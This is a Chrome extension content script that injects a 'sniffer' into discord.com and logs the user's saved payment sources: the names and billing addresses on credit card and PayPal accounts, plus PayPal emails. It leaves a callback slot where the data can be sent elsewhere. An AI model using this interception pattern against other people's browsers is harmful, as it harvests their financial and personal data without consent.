// Inject the sniffer.
const sniffer = document.createElement("script");
sniffer.src = chrome.runtime.getURL("src/sniffer.js");
sniffer.id = "discord-payments-script";
(document.head || document.documentElement).appendChild(sniffer);

window.addEventListener("message", event => {
    const { origin, data } = event;
    if (origin !== "https://discord.com") {
        return;
    } 
    
    /* Your callback here. */
    const creditCardAccounts = data.filter(account => account.type === 1);
    creditCardAccounts.forEach(account => {
        console.groupCollapsed("Credit card account");
        console.log(`Owner : ${account.billing_address.name}`);
        console.log(`Address : ${account.billing_address.line_1}${account.billing_address.line_2 ? ` - ${account.billing_address.line_2}` : ""}, ${account.billing_address.postal_code} ${account.billing_address.city} (${account.billing_address.country}${account.billing_address.state ? `in state of ${account.billing_address.state}` : ""})`);
        console.groupEnd();
    });

    const paypalAccounts = data.filter(account => account.type === 2);
    paypalAccounts.forEach(account => {
        console.groupCollapsed("Paypal account");
        console.log(`Owner : ${account.billing_address.name}`);
        console.log(`Address : ${account.billing_address.line_1}${account.billing_address.line_2 ? ` - ${account.billing_address.line_2}` : ""}, ${account.billing_address.postal_code} ${account.billing_address.city} (${account.billing_address.country}${account.billing_address.state ? `in state of ${account.billing_address.state}` : ""})`);
        console.log(`Owner's email : ${account.email}`);
        console.groupEnd();
    });
});